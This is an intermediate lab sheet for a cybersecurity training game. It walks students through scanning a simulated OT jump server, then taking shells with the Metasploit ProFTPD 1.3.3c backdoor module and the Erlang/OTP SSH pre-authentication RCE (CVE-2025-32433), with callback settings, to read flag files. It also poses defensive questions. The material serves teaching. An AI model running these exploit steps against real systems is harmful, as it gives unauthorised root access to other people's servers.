---
title: "Critical Failure: VM Technical Steps"
author: ["Z. Cliffe Schreuders"]
license: "CC BY-SA 4.0"
description: "Technical companion to the Critical Failure walkthrough, for the OT jump server work: step-by-step hints for scanning the server, taking a root shell through its backdoored FTP service, getting an SSH foothold, reading the crew's documents and submitting the four flags, plus command-line practice."
tags: ["nmap", "service-enumeration", "ftp", "ssh", "erlang", "root-shell", "scada", "break-escape"]
categories: ["safetynet"]
redirect_from:
  - /labs/introducing_attacks/m04-critical-failure-vm-technical-steps/
type: ["game-based-learning", "lab-sheet"]
difficulty: "intermediate"
source: "https://github.com/cliffe/BreakEscape/tree/main/scenarios/m04_critical_failure"
cybok:
  - ka: "NS"
    topic: "Network Security"
    keywords: ["Network scanning (Nmap)", "Service enumeration"]
  - ka: "SOIM"
    topic: "PENETRATION TESTING"
    keywords: ["PENETRATION TESTING - SOFTWARE TOOLS", "VULNERABILITY ANALYSIS / VULNERABILITY SCANNING"]
  - ka: "MAT"
    topic: "Attacks and exploitation"
    keywords: ["EXPLOITATION", "Remote code execution"]
  - ka: "SS"
    topic: "Systems Security"
    keywords: ["Vulnerability exploitation", "Linux security"]
  - ka: "OSV"
    topic: "Primitives for Isolation and Mediation"
    keywords: ["Privilege escalation"]
  - ka: "CPS"
    topic: "Cyber-Physical Systems / Physical Security"
    keywords: ["SCADA/ICS protection"]
---

> Note: This is the technical companion to the [Critical Failure walkthrough](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/m04-critical-failure/). Play the game there first, and come here for the server work.

## Concepts: the Server Work

Three ideas carry the server work: finding what a host runs, what it means for a service to need no login, and what it means for a service to run as root.

### Port scanning and service versions {#concept-scan}

A scanner sends a short probe to each port and records what answers. An open port tells you a service is listening. A version scan goes further and asks the service to name itself, so you learn the software and its version, not only the number.

| What you see | What it probably is | What to try |
|--------------|---------------------|-------------|
| A web port that answers with a page | A web server with something to read | Open it and read every line |
| A port that answers with an SSH banner, but not OpenSSH | A different SSH implementation | Check the version against known flaws |
| Nothing on the common ports | The interesting service is on a higher port | Scan every port, not the default list |

Worked example. A version scan of a host might print lines like these (the port and names are placeholders):

```text
PORT        STATE SERVICE  VERSION
80/tcp      open  http     <web server and version>
21/tcp      open  ftp      <FTP server and version>
<high-port> open  ssh      <a name that is not OpenSSH>
```

> Question: The web and FTP services are on their usual ports. Why would a careful tester scan every port before deciding the host has only those two?

### A flaw before the login {#concept-preauth}

Most services check who you are before they do anything for you. A pre-authentication flaw is a bug in the code that runs before that check. The daemon processes a message it should only accept from a logged-in user, so an attacker needs no password, key or account.

Think of a door guard who checks your name after you have walked into the hall. The guard is in the wrong place, and anyone can walk past the name check.

When a service is affected, its version number tells you whether the flaw is present. Vendors publish the affected version ranges in the advisory for the CVE (a standard ID for a known flaw).

> Question: If a daemon handles a message before it checks the caller, what does a version number tell you that a password prompt cannot?

### A service that already runs as root {#concept-root-service}

Every network service runs as some user account. When a service runs as **root** — the system administrator — any flaw that gives you a shell through it gives you a *root* shell straight away. There is no further step to climb: you are already the most privileged user on the box, and every file is yours to read, including files no ordinary account could open.

That is the case on this jump server. The backdoored file-transfer service runs as root, so the moment you trigger its backdoor you hold a root shell. Root's own home folder, `/root`, is readable only by root, and the crew left two documents there. Both are yours from that one shell: you do not need to escalate, because the service handed you root to begin with.

The lesson for a defender is the mirror image: a service exposed to the network should run as the least-privileged account that can do its job, so that a flaw in it costs a foothold, not the whole machine.

> Question: A service you have just exploited runs as root. Why does that remove the need for a separate privilege-escalation step, and what does it let you read that an ordinary user's shell could not?

## Stuck? Hints: the Server Work

These five stages follow the server work in order: getting onto the attack box, mapping the jump server, the FTP drop (whose backdoor already gives a root shell, and with it both root-only documents), the SSH foothold, and the drop-site. Read each hint and try it first. Open the Nudge if you need the method, and the Recipe last.

### Stage 1: Getting onto the Kali Box {#hints-vm-connect}

**Where:** the workshop terminal. **Goal:** log in to Kali and find the jump server's address.

> Hint: The terminal is a full Kali machine, and the jump server is a different machine. Both the login and the address are in the workshop, if you know where to look.

<details markdown="1">
<summary>Nudge</summary>

The Kali login is on the sticky note on the terminal. The jump server's address is in the traffic on the Network Monitoring Station, the monitor in the workshop, and on the crew's job card from the OptiGrid Tool Case.
**Learn it:** ==action: Before you scan anything, confirm the target answers==. A host that does not reply to a ping may still have open ports, so treat the ping as a check and not as proof.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Log in to Kali with the login on the sticky note==.
2. \==action: Note the jump server's address== from the Network Monitoring Station.
3. \==action: Check the server answers== with `ping -c 3` and that address.

</details>

### Stage 2: Mapping the Jump Server {#hints-vm-scan}

**Where:** the Kali shell. **Goal:** find every open service on the jump server and read the one that is a web page.

> Hint: Start wide, then look closer. Most of what you need is on ordinary ports, but one service is not on an ordinary port.

<details markdown="1">
<summary>Nudge</summary>

Scan every TCP port first, then ask the open ports what they are. The web service answers with the rack-status page the control room trusts, and every bank reads NOMINAL on it. This is the falsified feed at the heart of the mission, so read it as a document first and note what it claims about the banks and the interlocks. The first flag is published on that page, at the end of the status text. The odd high port is a second service, and the version scan will not call it OpenSSH. If you have read the crew's job card from the OptiGrid Tool Case, it names that port, so you can check it directly; the full sweep finds it either way.

**Learn it:** ==action: Compare the two scans== (the quick scan and the full one) and note which ports only the full scan found.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Scan every TCP port== on the jump server:

```bash
nmap -p- <jump-server-address>
```

2. \==action: Version-scan the open ports== the first scan found:

```bash
nmap -sV -p <open-ports> <jump-server-address>
```

3. \==action: Open the web service== in a browser on Kali, or fetch it with `curl http://<jump-server-address>/`. \==action: Read the status page== (the falsified rack feed), then copy the flag printed at the end of the status text.
4. \==action: Keep the second service's port and version== for stage 4.

</details>

> Warning: A scan of only the common ports misses the high port. Most students who think the box has one service have not run the full scan.

### Stage 3: The FTP Drop — a Root Shell {#hints-vm-ftp}

**Where:** the Kali shell and Metasploit. **Goal:** take a root shell through the FTP service and read **both** documents the crew left in root's home.

> Hint: The FTP service's version is the clue. Check it against the backdoored build you met at St Catherine's. The shell it hands you is root, so read everything under `/root`.

<details markdown="1">
<summary>Nudge</summary>

The FTP server runs a build with a backdoor, the same one you met earlier in the campaign. Metasploit has a module for it, and the shell it gives you is **root** — so you own the box from this one step, with no escalation to climb. Root's home folder, `/root`, holds two documents, and both are yours from this shell:

- `optigrid_transfer/coordination_notes` — the cross-cell coordination intel. It says the jump host sits between the corporate LAN and the BMS/SCADA segment, that the telemetry stays falsified while the control room trusts the feed, and that the charge-ceiling change is staged under a root-only calibration override. The flag at its end is **flag 2** (the FTP-drop flag).
- `root_only/bms_calibration_override` — the real payload: the calibration override that replaces the safe charge ceiling on banks A, B and C with OptiGrid's profile, driving the racks past their limit while the historian still publishes NOMINAL. The flag at its end is **flag 3** (the root-only override flag).

List all of `/root`, read both documents, and take both flags. Agent HaX offers the ProFTPD field guide on your phone after you submit the first flag. Ask for it there.

**Learn it:** ==action: Before you run the exploit, check the module's options==. A wrong port or a wrong callback address fails silently.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Start Metasploit== with `msfconsole`.
2. \==action: Find the module== with `search proftpd_133c`, then select it:

```text
use exploit/unix/ftp/proftpd_133c_backdoor
```

3. \==action: Set the target and your callback==, using the FTP port your scan found and the Kali address:

```text
set RHOSTS <jump-server-address>
set RPORT <ftp-port>
set LHOST <kali-address>
set LPORT <callback-port>
```

4. \==action: Run `exploit`==, then confirm you are root and list all of root's home. The shell may not start in `/root`, so use full paths:

```bash
id
ls -R /root
```

5. \==action: Read both documents and copy the flag at the end of each==:

```bash
cat /root/optigrid_transfer/coordination_notes
cat /root/root_only/bms_calibration_override
```

The first file carries **flag 2**; the second, the root-only override, carries **flag 3**. One root shell gives you both.

</details>

> Warning: If Metasploit says no session was created, check that the callback port is free on Kali and that the jump server can reach `LHOST`.

> Note: Both flag 2 and flag 3 come from this one root shell. Flag 3 is the root-only calibration override — the smoking gun. There is no separate privilege-escalation step in this mission; the backdoored service runs as root, so reading the root-only file is just `cat`.

### Stage 4: The Erlang/OTP SSH Foothold {#hints-vm-erlang}

**Where:** the Kali shell and Metasploit. **Goal:** get a command shell on the jump server without a login, and read the operator notes.

> Hint: The odd high port is an SSH service, but its version does not say OpenSSH. The crew's job card calls it their way back in. Look up what that software is and what it is known to get wrong.

<details markdown="1">
<summary>Nudge</summary>

The Erlang/OTP SSH daemon has a pre-authentication flaw (CVE-2025-32433). You need no username or password, and the shell you get belongs to the daemon's service account, not root. In that account's home folder, inside `optigrid_toolkit`, read the file `operator_notes`: a document that says this jump server is the way onto Albion's control stack, that the crew left the daemon reachable on its high port as a way back in, and that the real work on the banks happens through the root calibration override. Read it, then take the flag printed at the end of the file. Ask Agent HaX for the Erlang SSH guide on your phone after you submit the FTP flag.

**Learn it:** ==action: Confirm the version before you exploit it==. A patched daemon accepts the connection and does nothing.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Confirm the daemon== on its odd port:

```bash
nmap -sV -p <high-port> <jump-server-address>
```

2. \==action: Start Metasploit== and select the module:

```text
use exploit/linux/ssh/ssh_erlangotp_rce
```

3. \==action: Set the target, the port and your callback==:

```text
set RHOSTS <jump-server-address>
set RPORT <high-port>
set LHOST <kali-address>
set LPORT <callback-port>
exploit
```

4. \==action: Confirm who you are on the box==. This account is the daemon's service account, not root:

```bash
id
hostname
```

5. \==action: Read the operator notes== in the toolkit folder in the account's home, then copy the flag printed at the end:

```bash
cat ~/optigrid_toolkit/operator_notes
```

This carries **flag 4** (the SSH-foothold flag).

</details>

> Warning: A session that opens and drops at once usually means the callback is unstable. Retry, or pick a simpler payload. The Erlang SSH channel is narrow.

> Note: This foothold is the daemon's service account, not root — it proves the crew's own way back in (flag 4). Root, and the root-only override, you already have from the FTP backdoor in stage 3. There is no separate escalation step: the mission does not need one.

### Stage 5: Submitting the Four Flags {#hints-vm-dropsite}

**Where:** the SAFETYNET Drop-Site Terminal in the workshop. **Goal:** submit each flag you earned.

> Hint: Each flag is proof of one step, and the terminal takes them one at a time. You do not need to submit them in any particular order.

<details markdown="1">
<summary>Nudge</summary>

Each flag you read on the server is for one step, and the step's task on the objectives panel ticks when the flag is accepted. The aim that covers the server work completes once every flag is in.

**Learn it:** ==action: Look at the objectives panel after each submission==. A task that did not tick usually means the flag was copied wrong.

</details>

<details markdown="1">
<summary>Recipe</summary>

1. \==action: Go back to the workshop== and open the SAFETYNET Drop-Site Terminal.
2. \==action: Submit each flag== you copied, one at a time, with the step it belongs to.
3. \==action: Check the objectives panel== for all four submitted steps before you leave the workshop.

</details>

> Warning: Copy the flag text exactly. A flag typed from memory, or pasted with extra spaces, is refused without an error that tells you why.

## Server Errors and What They Usually Mean

| Message or symptom | Usual cause |
|--------------------|-------------|
| A port does not answer | The service is on another port, or it stopped. Rescan that port. |
| Metasploit says no session was created | The callback cannot reach Kali. Check `LHOST` and the callback port. |
| The module runs and nothing happens | The version is not in the affected range, or you picked the wrong module. Run `info` on the module. |
| `cat /root/...` says "Permission denied" | You are not root. The FTP backdoor's shell is root; the Erlang foothold's is not. Read root's files from the FTP shell. |
| `/root` looks empty or a file is missing | You are reading from the foothold account, which cannot see into `/root`. Use the root shell from stage 3. |

## Try It on the Command Line (Optional)

### Scanning a machine you own {#cli-scan}

Run a full scan against your own machine, then compare it with the list of listening sockets the system keeps. ==action: Scan every port on your own machine and read the service names==:

```bash
nmap -p- -sV 127.0.0.1
ss -tlnp
```

> Warning: Only scan machines you own or have written permission to test. A scan of anyone else's system can be an offence.

> Question: Did `nmap` and `ss` agree on every port? If not, which one would you trust for a service you cannot log in to, and why?

### Which user runs a service {#cli-service-user}

On a machine you own, ==action: see which account each listening service runs as==:

```bash
ss -tlnp
ps -o user= -p <pid-from-ss>
```

> Question: If a service in that list runs as root, what does a code-execution flaw in it hand an attacker, and how is that different from the same flaw in a service running as an unprivileged account?

## After the Game: Attacking the Server

> Question: The Erlang daemon was on a port the common-ports scan misses. What would a defender do with that fact, beyond closing the port?

> Question: The Erlang flaw needs no login. Which controls would have stopped it, and which would have made no difference?

> Question: The file-transfer service ran as root, so exploiting it gave a root shell outright, and with it the root-only override. What should the plant have changed so that a flaw in that service cost a foothold rather than the whole box?

> Action: Write a short scan record for the jump server: host, open ports, services with versions, the priority you would give each, and the one check you would run first. Note which service, if exploited, would hand over the most, and why.

## Further Reading

- [SAFETYNET Field Guide: Erlang/OTP SSH RCE](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/erlang-otp-ssh-rce/)
- [SAFETYNET Field Guide: ProFTPD Exploitation Workflow](https://cliffe.github.io/HacktivityLabSheets/labs/safetynet/proftpd-exploitation-workflow/)
- [CVE-2025-32433](https://nvd.nist.gov/vuln/detail/CVE-2025-32433) (Erlang/OTP SSH)





